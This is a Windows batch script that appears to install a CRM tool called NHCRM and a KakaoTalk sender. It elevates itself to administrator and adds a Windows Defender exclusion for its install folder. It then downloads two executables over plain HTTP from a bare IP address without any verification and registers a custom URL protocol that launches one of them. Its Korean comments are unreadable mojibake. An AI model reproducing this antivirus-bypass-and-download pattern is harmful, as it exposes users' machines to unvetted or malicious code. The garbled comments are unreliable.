@echo off

:: ���� ���͸� ���� (�ʱ�ȭ)
set "CURRENT_DIR=%cd%"

:: ������ ���� Ȯ��
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '%CURRENT_DIR%' -Verb RunAs"
    exit /b
)

:: ������ �������� ����� ���
if "%~1"=="" goto :eof
cd /d "%~1"

setlocal

:: NHCRM ��ġ ���
set "NH_DIR=%LOCALAPPDATA%\NHCRM"
set "LAUNCHER_URL=http://3.38.7.3:8000/static/download/launcher.exe"
set "SENDER_URL=http://3.38.7.3:8000/static/download/kakao_sender.exe"
set "LAUNCHER_EXE=%NH_DIR%\launcher.exe"
set "SENDER_EXE=%NH_DIR%\kakao_sender.exe"

:: ���� ����
if not exist "%NH_DIR%" mkdir "%NH_DIR%"

:: Defender ���� ���
echo [����] Defender ���� ��� ��...
powershell -Command "Add-MpPreference -ExclusionPath '%NH_DIR%'"

:: launcher.exe �ٿ�ε�
echo [�ٿ�ε�] launcher.exe �ٿ�ε� ��...
powershell -Command "Invoke-WebRequest -Uri '%LAUNCHER_URL%' -OutFile '%LAUNCHER_EXE%'"

:: kakao_sender.exe �ٿ�ε�
echo [�ٿ�ε�] kakao_sender.exe �ٿ�ε� ��...
powershell -Command "Invoke-WebRequest -Uri '%SENDER_URL%' -OutFile '%SENDER_EXE%'"

:: Ž���� ���� (���� ����)
if exist "%LAUNCHER_EXE%" (
    echo [�Ϸ�] launcher.exe �ٿ�ε� �Ϸ�
    start "" explorer "%NH_DIR%"
) else (
    echo [����] launcher.exe �ٿ�ε� ����
)
:: ������Ʈ�� ���
echo [������Ʈ�� ���] ������Ʈ�� ��� ��...
set "CMD_PATH=%NH_DIR%\launcher.exe"

reg add "HKCR\NHCRM" /ve /d "NHCRM Protocol" /f
reg add "HKCR\NHCRM\shell" /ve /d "" /f
reg add "HKCR\NHCRM\shell\open" /ve /d "" /f
reg add "HKCR\NHCRM\shell\open\command" /ve /d "\"%CMD_PATH%\" \"%%1\"" /f
reg add "HKCR\NHCRM" /v "URL Protocol" /d "" /f



pause
endlocal
